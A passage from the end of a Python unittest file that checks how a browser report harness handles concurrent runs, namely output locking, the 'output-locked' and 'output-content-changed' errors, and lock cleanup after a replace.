            changed_payload = parse_single_json_line(changed_stderr)
            self.assertEqual(
                changed_payload["error"]["code"], "output-content-changed"
            )
            self.assertTrue(concurrent_file.is_file())
            self.assertIn(
                "must survive", concurrent_file.read_text(encoding="utf-8")
            )
            self.assertFalse(output_lock_path(owned_output).exists())
            concurrent_file.unlink()
            preserved_report, _ = validate_report(owned_output)
            self.assertEqual(preserved_report["build"]["id"], "concurrency-initial")

            first_replace = popen_harness(
                *browser_arguments(
                    stable_site,
                    owned_output,
                    browser,
                    "concurrency-first",
                    "--replace",
                    "--settle-ms",
                    "600",
                ),
                environment=browser_environment(module_dir),
            )
            deadline = time.monotonic() + 20
            while time.monotonic() < deadline and not output_lock_path(owned_output).is_file():
                if first_replace.poll() is not None:
                    break
                time.sleep(0.05)
            self.assertTrue(output_lock_path(owned_output).is_file())
            second_replace = run_harness(
                *browser_arguments(
                    stable_site,
                    owned_output,
                    browser,
                    "concurrency-second",
                    "--replace",
                ),
                environment=browser_environment(module_dir),
            )
            self.assertEqual(second_replace.returncode, 2)
            self.assertEqual(
                parse_single_json_line(second_replace.stderr)["error"]["code"],
                "output-locked",
            )
            first_stdout, first_stderr = first_replace.communicate(timeout=180)
            self.assertEqual(first_replace.returncode, 0, first_stderr)
            self.assertTrue(parse_single_json_line(first_stdout)["execution_ok"])
            final_report, _ = validate_report(owned_output)
            self.assertEqual(final_report["build"]["id"], "concurrency-first")
            self.assertFalse(output_lock_path(owned_output).exists())


if __name__ == "__main__":
    unittest.main()
